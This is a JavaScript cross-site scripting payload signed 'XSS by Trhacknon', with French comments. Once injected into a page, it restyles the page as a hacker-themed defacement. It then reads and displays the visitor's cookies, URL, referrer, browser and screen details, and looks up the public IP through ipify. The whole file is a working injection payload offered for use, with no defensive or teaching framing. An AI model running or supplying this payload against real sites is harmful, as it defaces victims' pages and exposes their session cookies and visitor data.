(function() {
    // Style glitchy pour la page
    const style = `
        @keyframes glitch {
            0% { text-shadow: 2px 2px lime, -2px -2px cyan; }
            50% { text-shadow: -2px -2px lime, 2px 2px cyan; }
            100% { text-shadow: 2px 2px lime, -2px -2px cyan; }
        }
        body {
            background: black;
            color: lime;
            text-align: center;
            font-family: 'Courier New', monospace;
        }
        h2 {
            animation: glitch 1s infinite alternate;
            font-size: 28px;
            text-transform: uppercase;
        }
        .container {
            width: 90%;
            margin: auto;
            padding: 20px;
            border: 2px solid lime;
            box-shadow: 0 0 10px lime;
            text-align: left;
            background: rgba(0, 0, 0, 0.9);
        }
        table {
            width: 100%;
            margin: auto;
            border-collapse: collapse;
        }
        th, td {
            border: 1px solid lime;
            padding: 10px;
            text-align: left;
        }
        th {
            background: darkgreen;
            color: white;
        }
        .logo {
            margin-top: 20px;
            animation: glitch 1s infinite alternate;
        }
        .logo img {
            width: 100px;
            height: auto;
            margin: 10px;
        }
    `;

    // Ajouter le style à la page
    const styleElement = document.createElement('style');
    styleElement.innerHTML = style;
    document.head.appendChild(styleElement);

    // Titre de la page
    const title = document.createElement('h2');
    title.innerHTML = "🔌 XSS by Trhacknon 🔌";
    

    // Conteneur pour afficher les données
    const container = document.createElement('div');
    container.classList.add('container');
    document.body.appendChild(container);

    // Ajouter les logos SVG
    const logoContainer = document.createElement('div');
    logoContainer.classList.add('logo');
    logoContainer.innerHTML = `
        <img src="https://github.com/trh4ckn0n/work/raw/refs/heads/main/trknanon.svg" alt="Logo 1" />
        <img src="https://raw.githubusercontent.com/trh4ckn0n/work/refs/heads/main/trkncat.svg" alt="Logo 2" />
    `;
    document.body.appendChild(title);
    container.appendChild(logoContainer);

    // Table pour afficher les informations collectées
    const table = document.createElement('table');
    const headerRow = document.createElement('tr');
    headerRow.innerHTML = `
        <th>🔑 Clé</th>
        <th>📊 Valeur</th>
    `;
    table.appendChild(headerRow);
    const infoTableBody = document.createElement('tbody');
    infoTableBody.id = 'infoTable';
    table.appendChild(infoTableBody);
    container.appendChild(table);

    // Données à collecter
    const data = [
        { key: '🍪 COOKIE', value: document.cookie },
        { key: '🌐 DOMAIN', value: document.domain },
        { key: '📌 URL', value: window.location.href },
        { key: '📘 REFERRER', value: document.referrer || 'Aucun' },
        { key: '📑 TITRE', value: document.title },
        { key: '🔧 UserAgent', value: navigator.userAgent },
        { key: '🚀 AppVersion', value: navigator.appVersion },
        { key: '💻 PLATFORM', value: navigator.platform },
        { key: '🖥️ Screen', value: `${screen.width}x${screen.height}` },
        { key: '🌈 Couleurs', value: `${screen.colorDepth}-bit` },
        { key: '🔒 CookieEnabled', value: navigator.cookieEnabled },
        { key: '📱 Online', value: navigator.onLine },
        { key: '🗣️ LANGUAGE', value: navigator.language },
        { key: '⏱️ Temps de chargement', value: `${performance.now().toFixed(2)} ms` },
        { key: '📢 AdBlock', value: 'Vérification...' },
        { key: '💡 IP PUBLIC', value: 'Chargement...' }
    ];

    // Ajouter les données à la table
    data.forEach(d => {
        const row = document.createElement('tr');
        row.innerHTML = `<td>${d.key}</td><td>${d.value}</td>`;
        infoTableBody.appendChild(row);
    });

    // Récupérer l'IP publique avec l'API ipify
    fetch('https://api64.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
            const row = document.createElement('tr');
            row.innerHTML = `<td>💡 IP PUBLIC</td><td>${data.ip}</td>`;
            infoTableBody.appendChild(row);
        });

    // Vérification d'AdBlock
    fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', { method: 'HEAD' })
        .then(() => {
            const row = document.createElement('tr');
            row.innerHTML = `<td>📢 AdBlock</td><td>Non</td>`;
            infoTableBody.appendChild(row);
        })
        .catch(() => {
            const row = document.createElement('tr');
            row.innerHTML = `<td>📢 AdBlock</td><td>Oui</td>`;
            infoTableBody.appendChild(row);
        });

})();
